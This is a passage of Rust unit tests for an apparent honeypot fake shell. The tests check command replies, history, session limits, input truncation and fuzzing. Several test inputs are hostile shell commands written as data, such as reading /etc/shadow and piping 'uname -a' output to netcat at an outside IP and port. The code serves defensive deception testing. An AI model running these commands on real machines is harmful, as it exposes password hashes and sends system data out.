        let r = s.handle_line("sudo cat /etc/shadow").unwrap_reply();
        assert_eq!(r, "bash: sudo: command not found");
    }

    #[test]
    fn combinator_only_first_segment_simulated() {
        let mut s = session();
        // ; | && 只解析首个命令,完整命令原样入记录
        let r = s.handle_line("whoami; cat /etc/shadow").unwrap_reply();
        assert_eq!(r, "deploy");
        assert_eq!(s.steps[0].command, "whoami; cat /etc/shadow");
        let r = s
            .handle_line("uname -a | nc 203.0.113.9 4444")
            .unwrap_reply();
        assert!(r.contains("Linux debian-11"));
        let r = s.handle_line("pwd && whoami").unwrap_reply();
        assert_eq!(r, "/home/deploy");
    }

    #[test]
    fn history_lists_previous_commands() {
        let mut s = session();
        s.handle_line("whoami");
        s.handle_line("uname -a");
        let r = s.handle_line("history").unwrap_reply();
        assert!(r.contains("whoami") && r.contains("uname -a"));
        // history 自身不出现在输出里(真实 bash 亦然——执行时才入史)
        assert!(r.contains("    1  whoami"));
    }

    #[test]
    fn exit_and_command_limit_close_session() {
        let mut s = ShellSession::new("deploy", "h", 2);
        assert_eq!(s.handle_line("whoami"), ShellAction::Reply("deploy".into()));
        assert_eq!(s.handle_line("whoami"), ShellAction::Reply("deploy".into()));
        // 第 3 条命令:已达上限,优雅退出
        assert_eq!(s.handle_line("pwd"), ShellAction::Exit);
        let mut s2 = session();
        assert_eq!(s2.handle_line("exit"), ShellAction::Exit);
        assert_eq!(s2.handle_line("logout"), ShellAction::Exit);
    }

    #[test]
    fn long_and_binary_input_bounded_never_panic() {
        let mut s = session();
        // ≥4KB 超长输入：截断、可处理、有界留存
        let long = format!("cat /etc/passwd{}", "A".repeat(8192));
        assert!(matches!(s.handle_line(&long), ShellAction::Reply(_)));
        assert!(s.steps.last().unwrap().command.chars().count() <= MAX_CMD_CHARS);
        // 二进制乱码：控制字符清洗进记录,不 panic
        let garbage = "\u{0}\u{1}\u{7f}\u{9f}ls\u{3}";
        assert!(matches!(s.handle_line(garbage), ShellAction::Reply(_)));
        let recorded = &s.steps.last().unwrap().command;
        assert!(!recorded.chars().any(|c| c.is_control() && c != '\t'));
        // 空行与纯分隔符
        assert_eq!(s.handle_line("   "), ShellAction::Reply(String::new()));
        assert!(
            s.handle_line(";")
                .reply_contains("syntax error near unexpected token")
        );
    }

    #[test]
    fn fuzz_random_lines_never_panic() {
        let mut s = ShellSession::new("deploy", "h", 50);
        let mut state = 0x2545F4914F6CDD1Du64;
        for _ in 0..2000 {
            state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
            let n = (state >> 33) as usize % 300;
            let bytes: Vec<u8> = (0..n)
                .map(|_| {
                    state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
                    (state >> 33) as u8
                })
                .collect();
            let line = String::from_utf8_lossy(&bytes).to_string();
            let _ = s.handle_line(&line);
            assert!(s.steps.len() <= 2000);
            for step in &s.steps {
                assert!(step.command.chars().count() <= MAX_CMD_CHARS);
            }
        }
    }

    // ---- 断言辅助 ----

    impl ShellAction {
        fn reply_contains(&self, needle: &str) -> bool {
            matches!(self, ShellAction::Reply(text) if text.contains(needle))
        }
        fn unwrap_reply(self) -> String {
            match self {
                ShellAction::Reply(text) => text,
                ShellAction::Exit => panic!("期望 Reply,得到 Exit"),
            }
        }
    }
}
